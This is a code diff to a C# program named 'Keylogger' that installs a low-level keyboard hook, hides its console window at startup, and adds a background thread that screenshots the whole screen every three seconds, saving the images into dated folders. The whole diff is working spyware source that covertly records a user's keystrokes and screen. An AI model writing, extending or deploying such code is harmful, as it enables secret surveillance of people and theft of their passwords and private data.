@@ -1,4 +1,5 @@
 using System.Diagnostics;
+using System.Drawing.Imaging;
 using System.Runtime.InteropServices;
 
 namespace Keylogger
@@ -29,12 +30,6 @@ namespace Keylogger
 
         [DllImport("kernel32.dll", CharSet = CharSet.Auto, SetLastError = true)]
         private static extern IntPtr GetModuleHandle(string lpModuleName);
-
-        [DllImport("kernel32.dll")]
-        private static extern bool AllocConsole();
-
-        [DllImport("kernel32.dll")]
-        private static extern bool FreeConsole();
 
         private delegate IntPtr LowLevelKeyboardProc(int nCode, IntPtr wParam, IntPtr lParam);
 
@@ -76,15 +71,27 @@ namespace Keylogger
         }
         #endregion
 
-        #region Timer
+        #region windows
+        [DllImport("kernel32.dll")]
+        static extern IntPtr GetConsoleWindow();
+
+        [DllImport("user32.dll")]
+        static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);
+
+        const int SW_HIDE = 0;
+
+        const int SW_SHOW = 5;
+        #endregion
+
+        #region timer
         static void StartTimer()
         {
             Thread thread = new Thread(() =>
             {
                 while (true)
                 {
-                    Console.WriteLine("1 second passed");
-                    Thread.Sleep(1000);
+                    Thread.Sleep(captureTime);
+                    CaptureScreen();
                 }
             });
             thread.IsBackground = true;
@@ -92,13 +99,57 @@ namespace Keylogger
         }
         #endregion
 
+        #region capture
+        static string imagePath = "Image_";
+        static string imageExtendition = ".png";
+        static int imageCount = 0;
+        static int captureTime = 3000;
+
+        static void CaptureScreen()
+        {
+            //create a bitmap
+            var bmpScreenshot = new Bitmap(Screen.PrimaryScreen.Bounds.Width,
+                                        Screen.PrimaryScreen.Bounds.Height,
+                                        PixelFormat.Format32bppArgb);
+
+            //create a graphics object from the bitmap
+            var gfxScreenshot = Graphics.FromImage(bmpScreenshot);
+
+            //take the screenshot from the upper left corner to the right bottom corner
+            gfxScreenshot.CopyFromScreen(Screen.PrimaryScreen.Bounds.X,
+                                        Screen.PrimaryScreen.Bounds.Y,
+                                        0,
+                                        0,
+                                        Screen.PrimaryScreen.Bounds.Size,
+                                        CopyPixelOperation.SourceCopy);
+
+            string directoryImage = imagePath + DateTime.Now.ToLongDateString();
+            if (!Directory.Exists(directoryImage))
+            {
+                Directory.CreateDirectory(directoryImage);
+            }
+
+            //save the screenshots
+            string imageName = string.Format("{0}\\{1}{2}", directoryImage, imageCount, DateTime.Now.ToLongTimeString() + imageCount, imageExtendition);
+            try
+            {
+                bmpScreenshot.Save(imageName, ImageFormat.Png);
+            }
+            catch
+            {
+
+            }
+            imageCount++;
+        }
+        #endregion
+
         [STAThread]
         static void Main(string[] args)
         {
-            AllocConsole();
+            var handle = GetConsoleWindow();
+            ShowWindow(handle, SW_HIDE);
             StartTimer();
             HookKeyBoard();
-            FreeConsole();
         }
     }
 }
